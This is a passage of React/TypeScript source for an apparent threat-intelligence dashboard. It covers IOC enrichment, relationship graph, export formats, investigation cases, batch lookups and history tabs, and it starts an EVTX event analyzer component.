                        onChange={(e) => setFeedbackNotes(e.target.value)}
                        placeholder="Optional false-positive rationale or analyst note..."
                        className="flex-1 px-3 py-1.5 rounded text-xs border"
                        style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                      />
                      <button
                        type="button"
                        onClick={() => {
                          setFeedbackSubmitted(true);
                          onAddToast({ type: 'success', title: 'Verdict Override Submitted', description: `Logged correction (${feedbackCorrection.toUpperCase()}) to /api/ioc/feedback.` });
                        }}
                        className="px-3.5 py-1.5 rounded text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                      >
                        Submit Feedback
                      </button>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Internal Tab 2: Enrichment */}
            {resultTab === 'enrichment' && (
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 text-xs">
                <div className="p-4 rounded-xl border space-y-2" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}>
                  <h4 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                    🌍 GeoIP & Autonomous System (ASN)
                  </h4>
                  <CopyKV label="Country / City" value={`${baseProfile.geo.country} — ${baseProfile.geo.city}`} mono={false} />
                  <CopyKV label="ASN" value={baseProfile.geo.asn} />
                  <CopyKV label="Organization" value={baseProfile.geo.org} mono={false} />
                  <CopyKV label="Coordinates" value={baseProfile.geo.coords} />
                </div>

                <div className="p-4 rounded-xl border space-y-2" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}>
                  <h4 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                    🔒 TLS Certificate & JA3S Fingerprint
                  </h4>
                  <CopyKV label="Subject CN" value={baseProfile.ssl.subject} />
                  <CopyKV label="JA3S Fingerprint" value={baseProfile.ssl.ja3s} />
                  <CopyKV label="Serial Number" value={baseProfile.ssl.serial} />
                  <CopyKV label="Validity Window" value={`${baseProfile.ssl.validFrom} → ${baseProfile.ssl.validTo}`} />
                </div>

                <div className="p-4 rounded-xl border space-y-2" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}>
                  <h4 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                    🛰 Shodan Host Exposure & Vulnerabilities
                  </h4>
                  <CopyKV label="Operating System" value={baseProfile.shodan.os} mono={false} />
                  <CopyKV label="Open Ports" value={baseProfile.shodan.ports.join(', ')} />
                  <CopyKV label="Flagged CVEs" value={baseProfile.shodan.vulns.join(' · ')} />
                  <div className="space-y-1 pt-1">
                    {baseProfile.shodan.services.map((s) => (
                      <div key={s.port} className="sc-mono text-[11px] p-1.5 rounded" style={{ backgroundColor: 'var(--color-canvas)' }}>
                        Port {s.port}/{s.proto}: {s.banner}
                      </div>
                    ))}
                  </div>
                </div>

                <div className="p-4 rounded-xl border space-y-2" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}>
                  <h4 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                    📋 Passive DNS, WHOIS & Hudson Rock Infostealer
                  </h4>
                  <CopyKV label="WHOIS Registrar" value={`${baseProfile.whois.registrar} (Created ${baseProfile.whois.created})`} mono={false} />
                  <CopyKV label="AbuseIPDB Score" value={`${baseProfile.abuseIpdb.confidenceScore}% (${baseProfile.abuseIpdb.totalReports} reports)`} />
                  <CopyKV label="Hudson Rock Stealers" value={`${baseProfile.hudsonRock.compromisedHosts} hosts (${baseProfile.hudsonRock.stealerFamilies.join(', ')})`} />
                  <CopyKV label="urlscan.io DOM" value={baseProfile.urlscan.domStats} mono={false} />
                </div>
              </div>
            )}

            {/* Internal Tab 3: Sources Audit */}
            {resultTab === 'sources' && (
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="border-b" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                      <th className="py-2.5 px-3">Provider Name</th>
                      <th className="py-2.5 px-3">Execution Status</th>
                      <th className="py-2.5 px-3">Latency</th>
                      <th className="py-2.5 px-3">Verdict</th>
                      <th className="py-2.5 px-3">Evidence / Missing Key Hint</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
                    {baseProfile.providers.map((p) => (
                      <tr key={p.name}>
                        <td className="py-2.5 px-3 font-bold">{p.name}</td>
                        <td className="py-2.5 px-3 sc-mono">
                          {p.status === 'queried' ? '✅ queried' : '⏭ skipped'}
                        </td>
                        <td className="py-2.5 px-3 sc-mono">{p.latency}</td>
                        <td className="py-2.5 px-3">
                          <VerdictBadge verdict={p.verdict} />
                        </td>
                        <td className="py-2.5 px-3" style={{ color: 'var(--color-text-secondary)' }}>
                          {p.summary} {'missingKey' in p && p.missingKey ? `(${p.missingKey})` : ''}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}

            {/* Internal Tab 4: Relationships (Interactive SVG Force Graph + Table Toggle) */}
            {resultTab === 'relationships' && (
              <div className="space-y-4">
                <div className="flex flex-wrap items-center justify-between gap-3 text-xs">
                  <div className="flex flex-wrap items-center gap-2">
                    {Object.keys(nodeTypeFilter).map((nt) => (
                      <label key={nt} className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded border cursor-pointer" style={{ borderColor: 'var(--color-border)' }}>
                        <input
                          type="checkbox"
                          checked={nodeTypeFilter[nt]}
                          onChange={(e) => setNodeTypeFilter({ ...nodeTypeFilter, [nt]: e.target.checked })}
                        />
                        <span>{nt}</span>
                      </label>
                    ))}
                    <label className="inline-flex items-center gap-2 ml-2">
                      <span style={{ color: 'var(--color-text-secondary)' }}>Min Connections: {minConnections}</span>
                      <input
                        type="range"
                        min={1}
                        max={4}
                        value={minConnections}
                        onChange={(e) => setMinConnections(Number(e.target.value))}
                      />
                    </label>
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={() => setGraphViewMode('graph')}
                      className={`px-3 py-1 rounded text-xs font-semibold cursor-pointer ${graphViewMode === 'graph' ? 'sc-accent-bg text-white' : 'border'}`}
                      style={graphViewMode === 'graph' ? {} : { borderColor: 'var(--color-border)' }}
                    >
                      Force Graph View
                    </button>
                    <button
                      type="button"
                      onClick={() => setGraphViewMode('table')}
                      className={`px-3 py-1 rounded text-xs font-semibold cursor-pointer ${graphViewMode === 'table' ? 'sc-accent-bg text-white' : 'border'}`}
                      style={graphViewMode === 'table' ? {} : { borderColor: 'var(--color-border)' }}
                    >
                      Table Fallback View
                    </button>
                  </div>
                </div>

                {graphViewMode === 'graph' ? (
                  <div className="rounded-xl border p-4 relative overflow-hidden" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)' }}>
                    <div className="text-[11px] mb-2" style={{ color: 'var(--color-text-secondary)' }}>
                      Click any node in the relationship graph to pivot and execute a live lookup for that indicator:
                    </div>
                    <svg viewBox="0 0 680 340" className="w-full h-72">
                      {baseProfile.relationships.edges.map((edge, idx) => {
                        const s = baseProfile.relationships.nodes.find((n) => n.id === edge.source);
                        const t = baseProfile.relationships.nodes.find((n) => n.id === edge.target);
                        if (!s || !t) return null;
                        if (!nodeTypeFilter[s.type] || !nodeTypeFilter[t.type]) return null;
                        if (s.connections < minConnections || t.connections < minConnections) return null;
                        return (
                          <g key={idx}>
                            <line x1={s.x} y1={s.y} x2={t.x} y2={t.y} stroke="#4f6ef7" strokeWidth="2" className="sc-flow-edge" />
                            <text
                              x={(s.x + t.x) / 2}
                              y={(s.y + t.y) / 2 - 5}
                              fill="#94a3b8"
                              fontSize="10"
                              textAnchor="middle"
                            >
                              {edge.relation}
                            </text>
                          </g>
                        );
                      })}
                      {baseProfile.relationships.nodes
                        .filter((n) => nodeTypeFilter[n.type] && n.connections >= minConnections)
                        .map((node) => {
                          const colorMap: Record<string, string> = {
                            IP: '#ef4444',
                            Domain: '#f59e0b',
                            Hash: '#8b5cf6',
                            URL: '#06b6d4',
                            Email: '#ec4899'
                          };
                          return (
                            <g
                              key={node.id}
                              className="cursor-pointer"
                              onClick={() => executeLookup(node.id)}
                            >
                              <circle cx={node.x} cy={node.y} r="22" fill={colorMap[node.type] || '#6366f1'} fillOpacity="0.22" stroke={colorMap[node.type] || '#6366f1'} strokeWidth="2" />
                              <text x={node.x} y={node.y + 4} fill="#f8fafc" fontSize="10" fontWeight="bold" textAnchor="middle">
                                {node.type}
                              </text>
                              <text x={node.x} y={node.y + 36} fill="#e2e8f0" fontSize="11" textAnchor="middle">
                                {node.label}
                              </text>
                            </g>
                          );
                        })}
                    </svg>
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full text-left text-xs border-collapse">
                      <thead>
                        <tr className="border-b" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                          <th className="py-2 px-3">Indicator Node</th>
                          <th className="py-2 px-3">Type</th>
                          <th className="py-2 px-3">Connections</th>
                          <th className="py-2 px-3 text-right">Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
                        {baseProfile.relationships.nodes
                          .filter((n) => nodeTypeFilter[n.type] && n.connections >= minConnections)
                          .map((n) => (
                            <tr key={n.id}>
                              <td className="py-2 px-3 sc-mono font-bold">{n.id}</td>
                              <td className="py-2 px-3">{n.type}</td>
                              <td className="py-2 px-3 sc-mono">{n.connections}</td>
                              <td className="py-2 px-3 text-right">
                                <button
                                  type="button"
                                  onClick={() => executeLookup(n.id)}
                                  className="px-2.5 py-1 rounded text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                                >
                                  Pivot Lookup →
                                </button>
                              </td>
                            </tr>
                          ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>
            )}

            {/* Internal Tab 5: Export */}
            {resultTab === 'export' && (
              <div className="space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <div className="flex flex-wrap items-center gap-1.5">
                    {(['STIX 2.1', 'MISP', 'SIEM', 'CSV', 'HTML Report'] as const).map((fmt) => (
                      <button
                        key={fmt}
                        type="button"
                        onClick={() => setExportFormat(fmt)}
                        className={`px-3 py-1 rounded text-xs font-semibold cursor-pointer ${
                          exportFormat === fmt ? 'sc-accent-bg text-white' : 'border'
                        }`}
                        style={exportFormat === fmt ? {} : { borderColor: 'var(--color-border)' }}
                      >
                        {fmt}
                      </button>
                    ))}
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      downloadFileBlob(`ioc-${activeProfile.ioc}-${exportFormat.toLowerCase()}.txt`, `SecConflux Export (${exportFormat}) for ${activeProfile.ioc}`);
                      onAddToast({ type: 'success', title: `Exported ${exportFormat}`, description: `Downloaded ${exportFormat} bundle for ${activeProfile.ioc}.` });
                    }}
                    className="px-4 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                  >
                    ⬇ Download {exportFormat}
                  </button>
                </div>

                <pre className="p-4 rounded-xl sc-mono text-xs overflow-x-auto leading-relaxed" style={{ backgroundColor: 'var(--color-canvas)' }}>
                  {exportFormat === 'STIX 2.1'
                    ? `{\n  "type": "bundle",\n  "id": "bundle--secconflux-99412",\n  "objects": [\n    {\n      "type": "indicator",\n      "spec_version": "2.1",\n      "name": "${activeProfile.ioc}",\n      "pattern": "[ipv4-addr:value = '${activeProfile.ioc}']",\n      "confidence": ${activeProfile.score}\n    }\n  ]\n}`
                    : exportFormat === 'MISP'
                    ? `{\n  "Event": {\n    "info": "SecConflux IOC Enrichment: ${activeProfile.ioc}",\n    "threat_level_id": "1",\n    "Attribute": [{ "type": "ip-dst", "value": "${activeProfile.ioc}", "to_ids": true }]\n  }\n}`
                    : exportFormat === 'SIEM'
                    ? `CEF:0|SecConflux|IOCPlatform|2.0|100|Malicious IOC Detected|9|dst=${activeProfile.ioc} cs1Label=Verdict cs1=${activeProfile.verdict.toUpperCase()} cn1=${activeProfile.score}`
                    : exportFormat === 'CSV'
                    ? `indicator,type,verdict,score,malicious_votes\n"${activeProfile.ioc}","${activeProfile.type}","${activeProfile.verdict}",${activeProfile.score},${activeProfile.votes.malicious}`
                    : `<!DOCTYPE html><html><body><h1>SecConflux IOC Report: ${activeProfile.ioc}</h1><p>Verdict: ${activeProfile.verdict.toUpperCase()} (${activeProfile.score}/100)</p></body></html>`}
                </pre>
              </div>
            )}
          </div>
        </div>
      )}

      {/* 9.4 Sub-Tab: Investigations */}
      {subTab === 'investigations' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
          <div className="lg:col-span-4 rounded-xl p-4 sc-surface space-y-3">
            <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Active Investigation Cases ({cases.length})
            </h3>
            <div className="flex items-center gap-2">
              <input
                type="text"
                value={newCaseName}
                onChange={(e) => setNewCaseName(e.target.value)}
                placeholder="New case title..."
                className="flex-1 px-3 py-1.5 rounded-lg text-xs border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              />
              <button
                type="button"
                onClick={() => {
                  if (!newCaseName.trim()) return;
                  const created = {
                    id: `case-${Date.now()}`,
                    name: newCaseName.trim(),
                    created: 'Just now',
                    status: 'Open',
                    iocs: []
                  };
                  setCases([created, ...cases]);
                  setSelectedCaseId(created.id);
                  setNewCaseName('');
                  onAddToast({ type: 'success', title: 'Investigation Case Created', description: created.name });
                }}
                className="px-3 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer"
              >
                + Create
              </button>
            </div>
            <div className="space-y-2">
              {cases.map((c) => (
                <div
                  key={c.id}
                  onClick={() => setSelectedCaseId(c.id)}
                  className="p-3 rounded-lg border cursor-pointer transition"
                  style={{
                    backgroundColor: selectedCaseId === c.id ? 'var(--color-surface-raised)' : 'var(--color-canvas)',
                    borderColor: selectedCaseId === c.id ? 'var(--color-border-focus)' : 'var(--color-border)'
                  }}
                >
                  <div className="text-xs font-bold">{c.name}</div>
                  <div className="text-[11px] flex items-center justify-between mt-1" style={{ color: 'var(--color-text-secondary)' }}>
                    <span>{c.iocs.length} IOCs</span>
                    <span>{c.created}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="lg:col-span-8 rounded-xl p-5 sc-surface space-y-4">
            {(() => {
              const activeCase = cases.find((c) => c.id === selectedCaseId) || cases[0];
              return (
                <>
                  <div className="flex items-center justify-between border-b pb-3" style={{ borderColor: 'var(--color-border)' }}>
                    <div>
                      <h3 className="text-base font-bold">{activeCase.name}</h3>
                      <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                        Created: {activeCase.created} · Status: {activeCase.status}
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => {
                        if (cases.length <= 1) return;
                        const rem = cases.filter((x) => x.id !== activeCase.id);
                        setCases(rem);
                        setSelectedCaseId(rem[0].id);
                        onAddToast({ type: 'info', title: 'Case Deleted', description: activeCase.name });
                      }}
                      className="px-2.5 py-1 rounded text-xs border border-red-500/40 text-red-400 cursor-pointer"
                    >
                      Delete Case
                    </button>
                  </div>

                  {/* Add IOC to Case */}
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                    <input
                      type="text"
                      value={newCaseIoc}
                      onChange={(e) => setNewCaseIoc(e.target.value)}
                      placeholder="Indicator (e.g., 203.0.113.88)"
                      className="px-3 py-1.5 rounded text-xs sc-mono border"
                      style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                    />
                    <input
                      type="text"
                      value={newCaseNote}
                      onChange={(e) => setNewCaseNote(e.target.value)}
                      placeholder="Markdown note..."
                      className="px-3 py-1.5 rounded text-xs border"
                      style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                    />
                    <button
                      type="button"
                      onClick={() => {
                        if (!newCaseIoc.trim()) return;
                        setCases(
                          cases.map((cs) =>
                            cs.id === activeCase.id
                              ? {
                                  ...cs,
                                  iocs: [
                                    ...cs.iocs,
                                    { value: newCaseIoc.trim(), type: 'Indicator', verdict: 'suspicious' as VerdictType, notes: newCaseNote || 'Added by analyst.' }
                                  ]
                                }
                              : cs
                          )
                        );
                        setNewCaseIoc('');
                        setNewCaseNote('');
                      }}
                      className="px-3 py-1.5 rounded text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                    >
                      + Attach IOC to Case
                    </button>
                  </div>

                  <div className="space-y-2.5">
                    {activeCase.iocs.map((entry, idx) => (
                      <div
                        key={idx}
                        className="p-3.5 rounded-lg border space-y-1.5"
                        style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                      >
                        <div className="flex items-center justify-between">
                          <span className="sc-mono text-xs font-bold">{entry.value}</span>
                          <div className="flex items-center gap-2">
                            <VerdictBadge verdict={entry.verdict} />
                            <button
                              type="button"
                              onClick={() => executeLookup(entry.value)}
                              className="text-xs underline cursor-pointer"
                              style={{ color: 'var(--accent-from)' }}
                            >
                              Lookup →
                            </button>
                          </div>
                        </div>
                        <div className="text-xs leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
                          {entry.notes}
                        </div>
                      </div>
                    ))}
                  </div>
                </>
              );
            })()}
          </div>
        </div>
      )}

      {/* 9.5 Sub-Tab: Batch */}
      {subTab === 'batch' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
          <div className="lg:col-span-5 rounded-xl p-5 sc-surface space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Batch IOC Input (Up to 100 IOCs)
              </h3>
              <span className="sc-mono text-[11px]" style={{ color: 'var(--color-text-tertiary)' }}>
                WebCrypto SHA-1 Active
              </span>
            </div>
            <textarea
              rows={8}
              value={batchText}
              onChange={(e) => setBatchText(e.target.value)}
              className="w-full p-3 rounded-lg text-xs sc-mono border"
              style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            />
            <div className="flex items-center justify-between gap-2">
              <button
                type="button"
                onClick={runBatchEnrichment}
                disabled={batchRunning}
                className="px-4 py-2 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer"
              >
                {batchRunning ? 'Processing SSE Stream...' : '▶ Run Batch Enrichment'}
              </button>
              <button
                type="button"
                onClick={() => {
                  downloadFileBlob('batch-ioc-results.json', JSON.stringify(batchResults, null, 2));
                  onAddToast({ type: 'success', title: 'Batch JSON Exported', description: `${batchResults.length} results downloaded.` });
                }}
                className="px-3 py-2 rounded-lg text-xs font-medium border cursor-pointer"
                style={{ borderColor: 'var(--color-border)' }}
              >
                ⬇ Export Batch JSON
              </button>
            </div>
          </div>

          <div className="lg:col-span-7 rounded-xl p-5 sc-surface space-y-3">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div className="flex items-center gap-1.5">
                {['all', 'malicious', 'suspicious', 'clean'].map((vf) => (
                  <button
                    key={vf}
                    type="button"
                    onClick={() => setBatchVerdictFilter(vf)}
                    className={`px-2.5 py-1 rounded-full text-xs font-semibold uppercase cursor-pointer ${
                      batchVerdictFilter === vf ? 'sc-accent-bg text-white' : 'border'
                    }`}
                    style={batchVerdictFilter === vf ? {} : { borderColor: 'var(--color-border)' }}
                  >
                    {vf}
                  </button>
                ))}
              </div>
              <input
                type="text"
                value={batchSearch}
                onChange={(e) => setBatchSearch(e.target.value)}
                placeholder="Filter batch results..."
                className="px-3 py-1 rounded text-xs sc-mono border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              />
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="border-b" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                    <th className="py-2 px-3">Indicator</th>
                    <th className="py-2 px-3">Type</th>
                    <th className="py-2 px-3">Verdict</th>
                    <th className="py-2 px-3">Score</th>
                    <th className="py-2 px-3 text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
                  {batchResults
                    .filter((r) => (batchVerdictFilter === 'all' ? true : r.verdict === batchVerdictFilter))
                    .filter((r) => r.ioc.toLowerCase().includes(batchSearch.toLowerCase()))
                    .map((r, i) => (
                      <tr key={i}>
                        <td className="py-2 px-3 sc-mono font-bold break-all">{r.ioc}</td>
                        <td className="py-2 px-3">{r.type}</td>
                        <td className="py-2 px-3">
                          <VerdictBadge verdict={r.verdict} />
                        </td>
                        <td className="py-2 px-3 sc-mono font-bold">{r.score}/100</td>
                        <td className="py-2 px-3 text-right">
                          <button
                            type="button"
                            onClick={() => executeLookup(r.ioc.split(' ')[0])}
                            className="px-2.5 py-1 rounded text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                          >
                            Inspect →
                          </button>
                        </td>
                      </tr>
                    ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* 9.6 Sub-Tab: History */}
      {subTab === 'history' && (
        <div className="rounded-xl p-5 sc-surface space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
            <div>
              <h3 className="text-sm font-bold">Cached Lookup History (Zero API Quota Spend on Reload)</h3>
              <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                Click any historical entry to reload its cached enrichment or click "Re-scan Live" to query fresh feeds
              </p>
            </div>
            <input
              type="text"
              value={historySearch}
              onChange={(e) => setHistorySearch(e.target.value)}
              placeholder="Filter history..."
              className="px-3 py-1.5 rounded-lg text-xs sc-mono border"
              style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            />
          </div>

          <div className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
            {historyList
              .filter((h) => h.ioc.toLowerCase().includes(historySearch.toLowerCase()))
              .map((h) => (
                <div key={h.id} className="py-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs">
                  <div className="flex items-center gap-3">
                    <VerdictBadge verdict={h.verdict} label={`${h.score}/100`} />
                    <span className="sc-mono font-bold">{h.ioc}</span>
                    <span className="px-2 py-0.5 rounded border text-[10px]" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                      {h.type}
                    </span>
                    <span style={{ color: 'var(--color-text-tertiary)' }}>{h.timestamp}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={() => {
                        setActiveQuery(h.ioc);
                        setSearchInput(h.ioc);
                        setSubTab('lookup');
                        onAddToast({ type: 'info', title: 'Loaded Cached Result', description: `Zero API quota spent for ${h.ioc}.` });
                      }}
                      className="px-3 py-1 rounded border font-medium cursor-pointer"
                      style={{ borderColor: 'var(--color-border)' }}
                    >
                      Reload Cached
                    </button>
                    <button
                      type="button"
                      onClick={() => executeLookup(h.ioc)}
                      className="px-3 py-1 rounded font-semibold text-white sc-accent-bg cursor-pointer"
                    >
                      ↻ Re-scan Live
                    </button>
                  </div>
                </div>
              ))}
          </div>
        </div>
      )}
    </div>
  );
};
// ============================================================================
// 11. TOOL 3: EVENT ANALYZER (Section 10 — #/t/events & #/t/events/investigation)
// ============================================================================
export const EventsTool: React.FC<{
  mainTab: string;
  subTab: string;
  setMainTab: (t: string) => void;
  setSubTab: (s: string) => void;
  initialSearchFilter: string;
  onClearInitialSearch: () => void;
  uploadModalOpen: boolean;
  setUploadModalOpen: (v: boolean) => void;
  onPivot: (req: Omit<PivotRequest, 'id' | 'timestamp'>) => void;
  onPinIoc: (item: Omit<IOCClipboardItem, 'id' | 'addedAt'>) => void;
  onAddToast: (t: Omit<ToastMessage, 'id'>) => void;
  userRole: UserRole;
}> = ({
  mainTab,
  subTab,
  setMainTab,
  setSubTab,
  initialSearchFilter,
  onClearInitialSearch,
  uploadModalOpen,
  setUploadModalOpen,
  onPivot,
  onPinIoc,
  onAddToast,
  userRole
}) => {
  const [investigations, setInvestigations] = useState(MORE_FIXTURES.eventInvestigations);
  const [activeInvId, setActiveInvId] = useState(MORE_FIXTURES.eventInvestigations[0].id);
  const activeInv = useMemo(
    () => investigations.find((i) => i.id === activeInvId) || investigations[0],
    [investigations, activeInvId]
  );

  // Filter state (10-field FTS5 filter bar)
  const [filterExpanded, setFilterExpanded] = useState(true);
  const [ftsQuery, setFtsQuery] = useState(initialSearchFilter || '');
  const [eventIdFilter, setEventIdFilter] = useState('');
  const [channelFilter, setChannelFilter] = useState('All');
  const [providerFilter, setProviderFilter] = useState('All');
  const [processFilter, setProcessFilter] = useState('');
  const [cmdFilter, setCmdFilter] = useState('');
  const [userFilter, setUserFilter] = useState('');
  const [hostFilter, setHostFilter] = useState('');
  const [bookmarkedOnly, setBookmarkedOnly] = useState(false);
  const [sortOrder, setSortOrder] = useState<'newest' | 'oldest'>('newest');

  // Event Detail Drawer state
  const [selectedEventId, setSelectedEventId] = useState<number | null>(null);
  const [drawerRawTab, setDrawerRawTab] = useState<'Header' | 'System' | 'EventData' | 'UserData'>('EventData');
  const [drawerSearch, setDrawerSearch] = useState('');
  const [drawerHeight, setDrawerHeight] = useState<number>(320);

  // IOC & Sigma sub-tab state
  const [iocTypeFilter, setIocTypeFilter] = useState('All');
  const [iocSearch, setIocSearch] = useState('');
  const [sigmaSeverityFilter, setSigmaSeverityFilter] = useState('All');
  const [sigmaSearch, setSigmaSearch] = useState('');
  const [selectedSigmaRule, setSelectedSigmaRule] = useState<(typeof activeInv.sigmaRules)[0] | null>(null);

  // Notes state with debounced auto-save
  const [notesText, setNotesText] = useState(activeInv.notes);
  const [saveState, setSaveState] = useState<'saved' | 'saving'>('saved');

  // Upload EVTX modal state
  const [evtxName, setEvtxName] = useState('LATMOV-WKS09-Sysmon.evtx');
  const [ingesting, setIngesting] = useState(false);
  const [ingestStep, setIngestStep] = useState(0);
  const [ingestTicker, setIngestTicker] = useState(0);

  useEffect(() => {
    if (initialSearchFilter) {
      setFtsQuery(initialSearchFilter);
      onClearInitialSearch();
    }
  }, [initialSearchFilter, onClearInitialSearch]);

  const handleNotesChange = (val: string) => {
    setNotesText(val);
    setSaveState('saving');
    setTimeout(() => {
      setSaveState('saved');
    }, 650);
  };

  const toggleBookmark = (evId: number) => {
    setInvestigations((prev) =>
      prev.map((inv) =>
        inv.id === activeInv.id
          ? {
              ...inv,
              events: inv.events.map((ev) => (ev.id === evId ? { ...ev, bookmarked: !ev.bookmarked } : ev))
            }
          : inv
      )
    );
  };

  const filteredEvents = useMemo(() => {
    const list = activeInv.events.filter((ev) => {
      if (bookmarkedOnly && !ev.bookmarked) return false;
      if (eventIdFilter && String(ev.eventId) !== eventIdFilter.trim()) return false;
      if (channelFilter !== 'All' && ev.channel !== channelFilter) return false;
      if (providerFilter !== 'All' && ev.provider !== providerFilter) return false;
      if (processFilter && !ev.processName.toLowerCase().includes(processFilter.toLowerCase())) return false;
      if (cmdFilter && !ev.commandLine.toLowerCase().includes(cmdFilter.toLowerCase())) return false;
      if (userFilter && !ev.user.toLowerCase().includes(userFilter.toLowerCase())) return false;
      if (hostFilter && !ev.computer.toLowerCase().includes(hostFilter.toLowerCase())) return false;
      if (ftsQuery) {
        const q = ftsQuery.toLowerCase();
        const hay = `${ev.summary} ${ev.commandLine} ${ev.processName} ${ev.user} ${ev.computer} ${ev.iocs.join(' ')}`.toLowerCase();
        if (!hay.includes(q)) return false;
      }
      return true;
    });
    return sortOrder === 'newest' ? list : [...list].reverse();
  }, [activeInv, bookmarkedOnly, eventIdFilter, channelFilter, providerFilter, processFilter, cmdFilter, userFilter, hostFilter, ftsQuery, sortOrder]);

  const selectedEvent = useMemo(
    () => activeInv.events.find((e) => e.id === selectedEventId) || null,
    [activeInv, selectedEventId]
  );

  const runEvtxIngestion = () => {
    setIngesting(true);
    setIngestStep(0);
    setIngestTicker(1420);
    const interval = setInterval(() => {
      setIngestTicker((t) => t + 6120);
      setIngestStep((s) => {
        if (s >= 2) {
          clearInterval(interval);
          setIngesting(false);
          setUploadModalOpen(false);
          setMainTab('investigation');
          setSubTab('events');
          onAddToast({
            type: 'success',
            title: 'EVTX Investigation Indexed',
            description: `Indexed 24,891 events from ${evtxName} into SQLite FTS5.`
          });
          return 2;
        }
        return s + 1;
      });
    }, 350);
  };

  if (mainTab === 'overview') {
    return (
      <>
        <ToolOverviewTemplate
          tool={TOOLS_REGISTRY.events}
          stats={[
            { label: 'Indexed Events (Current)', value: '24,891 EVTX Records' },
            { label: 'Search Engine', value: 'SQLite FTS5 Full-Text' },
            { label: 'Automated Detection', value: 'Sigma Rules + MITRE' },
            { label: 'Extracted Observables', value: '8 IOC Categories' }
          ]}
          doesList={[
            'Ingests multi-file and directory Windows EVTX logs (Security, Sysmon, PowerShell, System) into a fast SQLite FTS5 index.',
            'Provides a 10-dimension sticky filter bar with removable active filter chips and an interactive bottom Event Detail Drawer.',
            'Automatically extracts IPs, domains, hashes, URLs, file paths, and registry keys with event-count filtering.',
            'Matches events against production Sigma rules and pivots rules directly into RuleForge Workshop.'
          ]}
          doesNotList={[
            'Does not modify original uploaded `.evtx` evidence files — all indexing and bookmarking occurs in an isolated database.',
            'Does not require a full SIEM cluster deployment to hunt across local incident triage artifacts.'
          ]}
          terminalTitle="secconflux-events ingest WKS-FINANCE04-Sysmon.evtx --sigma-hunt"
